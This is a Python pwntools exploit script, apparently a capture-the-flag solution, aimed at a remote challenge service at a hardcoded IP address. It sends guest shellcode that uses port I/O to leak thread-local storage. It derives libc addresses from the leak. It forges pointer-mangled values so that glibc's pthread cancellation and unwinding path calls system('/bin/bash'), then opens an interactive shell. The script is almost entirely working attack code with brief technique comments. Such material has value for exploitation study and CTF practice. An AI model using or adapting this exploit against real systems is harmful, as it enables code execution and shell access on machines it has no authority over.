from pwn import *

context.arch = 'amd64'

###Util
def rol(val, cnt):
    return ((val << cnt) | (val >> (64 - cnt))) & ((1 << 64) - 1)

###Addr
libc_offset = 0x4003000
system_offset = 0x50d70

tls_offset = 0x4000740

###Exploit
r = remote('44.200.0.49', 10105)

r.sendlineafter(b'length : ', b'2')
r.sendafter(b'shellcode : ', b'\xeb\xfe')

sc = asm(f'''
          mov dx, 0x8001
          mov eax, 0x261000
          mov qword ptr [rax], 1
          mov qword ptr [rax + 0x08], 0x3ffffff
          mov qword ptr [rax + 0x10], 0x1000
          out dx, eax

          //overwrite tls and stuff
          mov dx, 0x8000
          mov eax, 0x261000
          mov qword ptr [rax], 0
          mov qword ptr [rax + 0x08], 0x3ffffff
          mov qword ptr [rax + 0x10], 0x1000
          out dx, eax

          //overwrite tls and stuff
          //mov dx, 0x8000
          //mov eax, 0x261000
          //mov qword ptr [rax], 0
          //mov qword ptr [rax + 0x08], 0x3ffffff
          //mov qword ptr [rax + 0x10], 0x1000
          //out dx, eax

          //trigger
          mov dx, 0x8000
          mov eax, 0x261000
          mov qword ptr [rax], 0
          mov qword ptr [rax + 0x08], 0
          mov qword ptr [rax + 0x10], 0x1
          out dx, eax

          hlt
          ''').ljust(0x1000, b'\xcc')

r.send(sc)

data = b''
while len(data) < 0x1000:
    print(hex(len(data)))
    data += r.recv(0x1000 - len(data))


#__GI__libc_read -> __GI__pthread_enable_asynccancel -> __do_cancel -> __GI___pthread_unwind -> _Unwind_ForcedUnwind -> link, demangle and call function
#cleanup_jmp_buf (fetched in __do_cancel) fs:0x300 (setjmp_cancel context, + 0x30 -> mangled rsp, + 0x38 -> mangled target)
#self->exc       (fetched in __GI__pthread_unwind) fs:0x10[0x670]

tls = u64(data[0x751:0x759])
guest_addr = tls-tls_offset
libc_base = guest_addr + libc_offset
print(hex(guest_addr))
print(hex(libc_base))

#set mangle ptr to 0
#upon overwriting fs:0x18 with '\x01', libc_read goes to the pthread path
payload = b'\x00' + b'/bin/bash\x00' + b'\x00'*0x26 + p64(rol(guest_addr + 0x4000000 - 8, 0x11)) + p64(rol(libc_base + system_offset, 0x11)) + data[0x41 : 0x751] + p64(guest_addr + 0x4000000 - 1 - 0x971) + p64(1) + data[0x761 : 0x771] + p64(0) + data[0x779 : 0xa41] + p64(guest_addr + 0x4000000) + p64(8) + data[0xa51:]
r.send(payload)

r.interactive()
